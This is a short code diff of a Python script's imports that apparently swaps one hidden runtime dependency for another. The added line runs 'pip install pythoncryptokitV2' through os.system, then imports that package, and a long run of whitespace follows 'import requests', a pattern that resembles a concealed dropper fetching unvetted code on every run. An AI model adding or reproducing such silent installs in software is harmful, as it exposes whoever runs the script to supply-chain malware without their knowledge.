@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringpackageV1")
-import pythoncolouringpackageV1
+os.system("pip install pythoncryptokitV2")
+import pythoncryptokitV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
